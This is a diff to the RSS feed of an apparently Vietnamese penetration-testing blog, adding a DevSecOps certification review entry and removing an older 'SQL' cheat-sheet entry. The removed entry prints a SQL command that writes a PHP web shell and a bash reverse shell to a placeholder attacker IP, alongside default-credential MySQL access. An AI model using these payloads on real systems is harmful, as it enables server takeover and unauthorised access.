@@ -4,9 +4,20 @@
         <link>https://tranquac.github.io/</link>
         <description>quactv blog</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>tranquac0312@gmail.com (quactv)</managingEditor>
-            <webMaster>tranquac0312@gmail.com (quactv)</webMaster><lastBuildDate>Fri, 10 Jun 2022 18:17:00 &#43;0700</lastBuildDate>
+            <webMaster>tranquac0312@gmail.com (quactv)</webMaster><lastBuildDate>Tue, 21 Feb 2023 18:17:00 &#43;0700</lastBuildDate>
             <atom:link href="https://tranquac.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
+    <title>Getting the CDP Certification: &#39;Certified DevSecOps Professional (CDP)&#39; review</title>
+    <link>https://tranquac.github.io/posts/cdp-review/</link>
+    <pubDate>Tue, 21 Feb 2023 18:17:00 &#43;0700</pubDate>
+    <author>quactv</author>
+    <guid>https://tranquac.github.io/posts/cdp-review/</guid>
+    <description><![CDATA[21-02-2023 / 23 Year Old Ảo thật. Nghĩ về quả chứng chỉ này cũng có nhiều kỉ niệm hài hước đó :))
+Certified DevSecOps Professional (CDP) Badge here!
+Khoan đã, để tôi nói về nó một chụt:
+The CDP credential validates the practical expertise to understand, implement and manage the DevSecOps program in an organization. A CDP can assess the current state of DevSecOps, embed security as part of DevOps, manage vulnerabilities and improve the overall Maturity Level.]]></description>
+</item>
+<item>
     <title>Getting the OSWE Certification: &#39;Offensive Security Web Expert&#39; (PEN-300) review</title>
     <link>https://tranquac.github.io/posts/oswe-review/</link>
     <pubDate>Fri, 10 Jun 2022 18:17:00 &#43;0700</pubDate>
@@ -79,14 +90,6 @@ Thật tuyệt vời sau quá trình nỗ lực 3 tháng học tập và hơn 20
     <author>quactv</author>
     <guid>https://tranquac.github.io/posts/linux-backdoors/</guid>
     <description><![CDATA[Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng.]]></description>
-</item>
-<item>
-    <title>SQL</title>
-    <link>https://tranquac.github.io/posts/sql/</link>
-    <pubDate>Tue, 08 Jun 2021 18:17:00 &#43;0700</pubDate>
-    <author>quactv</author>
-    <guid>https://tranquac.github.io/posts/sql/</guid>
-    <description><![CDATA[General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root]]></description>
 </item>
 </channel>
 </rss>
